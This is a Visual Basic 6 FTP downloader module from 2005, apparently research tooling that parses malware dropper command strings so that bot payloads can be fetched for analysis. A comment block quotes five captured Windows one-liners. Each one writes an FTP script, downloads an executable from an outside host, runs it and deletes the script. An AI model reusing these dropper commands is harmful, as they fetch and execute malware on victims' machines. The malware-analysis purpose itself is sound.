VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form CFtpGet 
   Caption         =   "CFtpGet"
   ClientHeight    =   495
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   1830
   LinkTopic       =   "CFtpGet"
   ScaleHeight     =   495
   ScaleWidth      =   1830
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer tmrTimeout 
      Enabled         =   0   'False
      Left            =   840
      Top             =   0
   End
   Begin MSWinsockLib.Winsock wsControl 
      Left            =   420
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock wsData 
      Left            =   0
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
End
Attribute VB_Name = "CFtpGet"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

'Author: david@idefense.com
'
'License: Copyright (C) 2005 David Zimmer <david@idefense.com, dzzie@yahoo.com>
'
'         This program is free software; you can redistribute it and/or modify it
'         under the terms of the GNU General Public License as published by the Free
'         Software Foundation; either version 2 of the License, or (at your option)
'         any later version.
'
'         This program is distributed in the hope that it will be useful, but WITHOUT
'         ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
'         FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for
'         more details.
'
'         You should have received a copy of the GNU General Public License along with
'         this program; if not, write to the Free Software Foundation, Inc., 59 Temple
'         Place, Suite 330, Boston, MA 02111-1307 USA
Public server As String
Public port
Public user As String
Public pass As String
Public TimeOut As Long
Public ftpPath As String
Public saveAs As String
Public EnforceMaxFileSize As Boolean


Public ServerBanner As String

Private ControlConnected As Boolean
Private DataConnected As Boolean
Private DataClosed As Boolean
Private TimedOut As Boolean
Private ResponseReceived As Boolean
Private ServerError As Boolean
Private LastResponse As String
Private LastResponseCode As Long

Private errors() As String
Private fHand As Long
Private FileSize As Long
Private Const MAX_FILE_SIZE As Long = 3000000 '~3mb

Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)

Enum dataMode
    mPASV = 0
    mport = 1
    mAuto = 3
End Enum


Property Get RealFileSize() As Long
    On Error Resume Next
    RealFileSize = FileLen(saveAs)
End Property


Private Property Let err_msg(msg As String)
    push errors, msg
End Property

Property Get ErrorMessage() As String
    ErrorMessage = errors(UBound(errors))
End Property

Property Get ErrorLog() As String()
    ErrorLog = errors
End Property

Sub Log(msg)
    Debug.Print msg
End Sub


Private Sub SendCommand(ftpCommand, Optional waitForResponse As Boolean = True)
    
    ServerError = False
    ResponseReceived = False
    
    Log ftpCommand
    wsControl.SendData ftpCommand & vbCrLf
    
    If Not waitForResponse Then Exit Sub
    
    If Not WaitFor(ResponseReceived) Then
        err_msg = "Failed to send command: " & ftpCommand
        Err.Raise 1, "Send Command", ErrorMessage
    End If
    
End Sub
 
'auto mode was designed to first try PASV then if cannot enter PASV mode
'to switch over to PORT and try again...failed against bot that didnt support PORT
'not sure if this is bot error or my error yet
Function GetFile(Optional mode As dataMode = mAuto) As Boolean
 On Error GoTo hell
 
    Dim lPar As Long, rPar As Long, Info As String, tmp() As String, pServer As String, pPort As Long
 
    FileSize = 0
    ControlConnected = False
    DataConnected = False
    DataClosed = False
    TimedOut = False
    ServerError = False
    Erase errors
    ServerBanner = Empty
    EnforceMaxFileSize = True
    
    If TimeOut = 0 Then TimeOut = 7000
    
    If FileExists(saveAs) Then
        err_msg = "saveAs file already exists"
        Exit Function
    End If
    
    If Len(server) = 0 Or port = 0 Then
        err_msg = "Server or port not configured properly"
        Exit Function
    End If
    
    With wsControl
        .Close
        .remoteHost = server
        .RemotePort = port
        .Connect
    End With
    
    If Not WaitFor(ControlConnected) Then
        err_msg = "Could not connect to " & server & ":" & port
        Exit Function
    End If
    
    SendCommand "USER " & user
    
    dbg llinfo, "Server Banner for " & server & " " & ServerBanner
    
    SendCommand "PASS " & pass
    SendCommand "TYPE I"
    
    fHand = FreeFile
    Open saveAs For Binary As fHand
        
tryAgain:

    If mode = mPASV Or mode = mAuto Then
            
            SendCommand "PASV"
                
            If Not WaitFor(LastResponseCode, 227) Then
                err_msg = "Could not enter passive mode"
                GoTo hell
            End If
                
            lPar = InStrRev(LastResponse, "(") + 1
            rPar = InStrRev(LastResponse, ")")
            Info = Mid(LastResponse, lPar, rPar - lPar)
            tmp = Split(Info, ",")
            pServer = Slice2Str(tmp, 0, 3, ".")
            pPort = (CLng(tmp(4)) * 256) + CLng(tmp(5))
               
            With wsData
               .Close
               .LocalPort = 0
               .RemotePort = pPort
               .remoteHost = pServer
               .Connect
            End With
            
            If Not WaitFor(DataConnected) Then
                err_msg = "PASV Could not open data connection to " & pServer & ":" & pPort
                GoTo cleanup
            End If
            
            Log "PASV Mode Data Connected to " & pServer & ":" & pPort
            SendCommand "RETR " & ftpPath, False
    
    Else
    
            With wsData
                .Close
                .LocalPort = 0
                .Listen
                SendCommand "PORT " & Replace(.LocalIP, ".", ",") & "," & .LocalPort \ 256 & "," & .LocalPort Mod 256
            End With
            
            SendCommand "RETR " & ftpPath, False
    
            If Not WaitFor(DataConnected) Then
                err_msg = IIf(TimedOut, "Timedout: ", "") & " PORT Mode " & server & " didnt connect back to " & wsData.LocalPort
                GoTo cleanup
            End If
        
            Log "PORT Mode Data Connected"
    
    End If
    
    
    
    If Not WaitFor(DataClosed) Then
        err_msg = "Could not complete download of file, current size: " & LOF(fHand)
        GoTo cleanup
    End If
    
    If FileSize > 0 Then
        If LOF(fHand) <> FileSize Then
            err_msg = "Incomplete Download: " & LOF(fHand) & "/" & FileSize & " " & saveAs
            CloseFile fHand
            Exit Function
        End If
    End If
    
    CloseFile fHand
    GetFile = True

    On Error Resume Next
    'SendCommand "QUIT"
    wsData.Close
    wsControl.Close
    
Exit Function
hell:
      
      If ServerError And LastResponseCode = 425 And mode = mAuto Then
            mode = mport 'Could not enter pasv mode
            GoTo tryAgain
      End If
    
      err_msg = "GetFile Error: " & Err.Description & " Line: " & Erl

cleanup:
      CloseFile fHand
            
      On Error Resume Next
      Kill saveAs
      wsData.Close
      wsControl.Close
      
End Function


Function WaitFor(flag, Optional value = True) As Boolean

    tmrTimeout.Enabled = False
    tmrTimeout.Interval = TimeOut
    tmrTimeout.Enabled = True
    
    Do Until flag = value
        DoEvents
        Sleep 30
        If TimedOut Then Exit Function
        If ServerError Then
            tmrTimeout.Enabled = False
            Exit Function
        End If
    Loop
    
    tmrTimeout.Enabled = False
    WaitFor = True
    
End Function





Private Sub tmrTimeout_Timer()
    tmrTimeout.Enabled = False
    TimedOut = True
End Sub

Private Sub wsControl_Close()
    err_msg = "Control Connection Closed"
    ServerError = True
End Sub

Private Sub wsControl_Connect()
    ControlConnected = True
End Sub

Private Sub wsControl_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
    err_msg = "Control connection Error"
    ServerError = True
End Sub


Private Sub wsData_Close()
    On Error Resume Next
    wsData.Close
    DataConnected = False
    DataClosed = True
End Sub

Private Sub wsData_Connect()
    DataConnected = True
End Sub

Private Sub wsData_ConnectionRequest(ByVal requestID As Long)
    'PORT mode they connect to us
    wsData.Close
    wsData.Accept requestID
    DataConnected = True
End Sub

Private Sub wsData_DataArrival(ByVal bytesTotal As Long)
    On Error GoTo haderr
    
        tmrTimeout.Enabled = False '\_reset
        tmrTimeout.Enabled = True  '/
        
        Dim buf() As Byte, sz As Long
        ReDim buf(bytesTotal - 1) As Byte
        
        wsData.GetData buf(), , bytesTotal
        
        
        If EnforceMaxFileSize Then
            sz = RealFileSize()
            If sz > MAX_FILE_SIZE Then
                CloseFile fHand
                dbg llreal, "FTPGET REACHED MAX FILE SIZE CLOSING FILE EARLY " & saveAs
                ServerError = True
                CloseSocket wsData
                Exit Sub
            End If
        End If

        Put fHand, , buf
Exit Sub
haderr:
End Sub

Private Sub wsControl_DataArrival(ByVal bytesTotal As Long)
    Dim msg() As String
    Dim indata As String
    Dim i As Long
    On Error GoTo hell
    
    tmrTimeout.Enabled = False '\_reset
    tmrTimeout.Enabled = True  '/
    
    wsControl.GetData indata, vbString, bytesTotal

    msg() = Standardize(indata)
    
    For i = 0 To UBound(msg)
        If Len(msg(i)) > 0 Then
             Log msg(i)
             LastResponseCode = CLng(Left(msg(i), 3))
             LastResponse = Mid(msg(i), 4, Len(msg(i)))
             
             Select Case LastResponseCode
                 Case 110, 202, 332, 421, 426, 450, 451, _
                      452, 500, 501, 502, 503, 504, 530, 532, _
                      550, 551, 552, 553, 425 '425=nopasv mode
                      
                      ServerError = True
             End Select
             
             If LastResponseCode = 220 Then ServerBanner = LastResponse
             If LastResponseCode = 150 Then FileSize = ParseFileSize(LastResponse)
             
             If LastResponseCode = 225 Or LastResponseCode = 226 Then
                'this can truncate download if data not done recv yet
                'so we will trust that server is responsible and closes data stream when done..
                'DataClosed = True
             End If
            
             ResponseReceived = True
        End If
    Next
    Exit Sub
hell:     err_msg = "Error in WsControlDataArrival: " & Err.Description
End Sub


Function ParseFileSize(msg) As Long
    '150 Data connection accepted from [ip]; transfer starting for [filename] (196664 bytes).
    
    On Error GoTo hell
    
    Dim A As Long
    Dim B As Long
    Dim tmp
    
    A = InStrRev(msg, "(")
    B = InStrRev(msg, "byte", , vbTextCompare)
    
    If B > A And A > 0 Then
        tmp = Trim(Mid(msg, A + 1, B - A - 1))
        If IsNumeric(tmp) Then ParseFileSize = CLng(tmp)
    End If
    
hell:
    
End Function



'deals with servers that may terminate lines with cr, lf , or crlf
Private Function Standardize(it) As String()
    If it = "" Or it = Empty Or (InStr(it, Chr(10)) < 0 And InStr(it, Chr(13)) < 0) Then Exit Function
    
    Dim s() As String, i As Integer
    If InStr(1, it, Chr(10)) Then
      it = Replace(it, Chr(13), "")
      s() = Split(it, Chr(10))
    Else
      s() = Split(it, Chr(13))
    End If
    
    For i = 0 To UBound(s)
      s(i) = LTrim(Trim(s(i)))
    Next
    
    Standardize = s()
End Function

Private Function Slice2Str(ary, lbnd, ubnd, Optional joinChr As String = ",")
    If lbnd > ubnd Then Slice2Str = "ERROR": Exit Function
    Dim tmp(), i As Long
    ReDim tmp(ubnd - lbnd)
    For i = 0 To UBound(tmp)
        tmp(i) = ary(lbnd + i)
    Next
    Slice2Str = Join(tmp, joinChr)
End Function

Private Sub push(ary, value)
  On Error GoTo fresh
    ReDim Preserve ary(UBound(ary) + 1)
    ary(UBound(ary)) = value
  Exit Sub
fresh: ReDim ary(0): ary(0) = value
End Sub

'quick-n-dirty
Function LoadFtpString(ByVal x) As Boolean
    Dim at, authinfo, serverinfo, tmp, slash, sc
    
    On Error GoTo hell
    Erase errors
    
1    x = Replace(x, "ftp://", "")
2    at = InStrRev(x, "@")
    If at > 0 Then 'is user:pass@server:port type login
3       authinfo = Mid(x, 1, at - 1)
4       serverinfo = Mid(x, at + 1)
5       tmp = Split(authinfo, ":")
6       user = tmp(0)
7       pass = tmp(1)
8       If InStr(serverinfo, ":") > 0 Then
9           tmp = Split(serverinfo, ":")
10           server = tmp(0)
             sc = InStr(tmp(1), "/")
             If sc > 0 Then
                ftpPath = Mid(tmp(1), sc + 1)
                port = Mid(tmp(1), 1, sc - 1)
             Else
11              port = tmp(1)
            End If
       Else
12           server = serverinfo
13           port = 21
       End If
    Else 'is anonymous login type url
       user = "anonymous"
       pass = "someone@somewhere.com"
14       slash = InStr(x, "/")
15       sc = InStr(x, ":")
       If sc > 0 Then
16        server = Mid(x, 1, sc - 1)
          If slash > 0 Then
17                port = Mid(x, sc + 1, (slash - 1) - sc)
18                ftpPath = Mid(x, slash, Len(x))
          Else
19                port = Mid(x, sc + 1, Len(x))
          End If
       Else
          port = 21
          If slash > 0 Then
20                server = Mid(x, 1, slash - 1)
21                ftpPath = Mid(x, slash, Len(x))
          Else
                server = x
          End If
       End If
    End If
    
    If ftpPath = "/" Or Right(ftpPath, 1) = "/" Then
        err_msg = "No FtpFile provided to download"
        Exit Function
    End If
       
    LoadFtpString = True
    
    Log "FtpString Parse Ok: " & vbCrLf & _
             "Port: " & port & vbCrLf & _
            "Server: " & server & vbCrLf & _
            "User: " & user & vbCrLf & _
            "Pass: " & pass & vbCrLf & _
            "ftppath:" & ftpPath
    
Exit Function
hell:
    err_msg = "Ftp url parse failed: " & x & vbCrLf & "Desc: " & Err.Description & " Line " & Erl
    
End Function



'echo open nusphere.com.ar 21 >hgz.dll &echo user fumado@nusphere.com.ar churro >>hgz.dll &echo binary >>hgz.dll &echo get >>hgz.dll &echo wspad.exe >>hgz.dll &echo wspad.exe >>hgz.dll &echo bye >>hgz.dll &ftp.exe -n -s:hgz.dll &del hgz.dll &wspad.exe "
'echo open 0.0.0.0 10405 > o&echo user 1 1 >> o &echo get bling.exe >> o &echo quit >> o &ftp -n -s:o &bling.exe sywin.exe"
'echo open 69.40.108.172 13758>.pif echo user a a>>.pif echo binary>>.pif echo GET svchostt.exe>>.pif echo bye>>.pif echo @echo off >c.bat echo ftp -n -v -s:.pif >>c.bat echo svchostt.exe >>c.bat echo del .pif >>c.bat echo del /F c.bat >>c.bat echo exit /y >>c.bat c.bat
'echo open only.olympicz.net 58739 >mpjt3.dll &echo user wh0re gotfucked >>mpjt3.dll &echo binary >>mpjt3.dll &echo get >>mpjt3.dll &echo wks.exe >>mpjt3.dll &echo jvtdrv.exe >>mpjt3.dll &echo bye >>mpjt3.dll &ftp.exe -n -s:mpjt3.dll &del mpjt3.dll &jvtdrv.exe setup32.exe
'echo open 69.40.220.228 3686>.pif echo user a a>>.pif echo binary>>.pif echo GET msnmgd32.exe>>.pif echo bye>>.pif echo @echo off >c.bat echo ftp -n -v -s:.pif >>c.bat echo msnmgd32.exe >>c.bat echo del .pif >>c.bat echo del /F c.bat >>c.bat echo exit /y >>c.bat c.bat

Function LoadEchoString(ByVal E, remoteip) As Boolean
    
    Dim o As Long, u As Long, p As Long, f As Long, g As Long, s As Long
    
    On Error GoTo hell
    
    If InStr(E, "0.0.0.0") > 0 Then E = Replace(E, "0.0.0.0", remoteip)
    
    o = InStr(1, E, "open ", vbTextCompare)
    u = InStr(1, E, "user ", vbTextCompare)
    f = InStr(1, E, "ftp", vbTextCompare)
    g = InStr(1, E, "get ", vbTextCompare)
    
    If o < 1 Or u < 1 Or f < 1 Then Exit Function
        
    f = InStr(1, E, "open", vbTextCompare)
    
    o = o + 5
    s = InStr(o, E, " ")
    If s < 1 Then Exit Function
    server = Mid(E, o, s - o)
    port = Mid(E, s + 1, InStr(s + 1, E, " ") - s - 1)
    s = InStr(port, ">")
    If s > 0 Then port = Mid(port, 1, s - 1)
    If Not IsNumeric(port) Then port = 21
     
    u = u + 5
    s = InStr(u, E, " ")
    If s < 1 Then Exit Function
    user = Mid(E, u, s - u)
    pass = Mid(E, s + 1, InStr(s + 1, E, " ") - s - 1)
    
    s = InStr(pass, ">")
    If s > 1 Then pass = Mid(pass, 1, s - 1)
    
    g = g + 4
    s = InStr(g, E, ".exe", vbTextCompare) 'bat, pif, scr ?? need better? yeah :(
    If s < 1 Then Exit Function
    
    g = InStrRev(E, " ", s)
    If g < 1 Then Exit Function
    
    ftpPath = Mid(E, g + 1, s - g - 1 + 4)
    s = InStr(ftpPath, ">")
    If s > 1 Then ftpPath = Mid(ftpPath, 1, s - 1)
    
    LoadEchoString = True
    
hell:
    
End Function

Private Function FileExists(pth As String) As Boolean
    If Len(pth) = 0 Then Exit Function
    If Dir(pth) <> "" Then FileExists = True
End Function
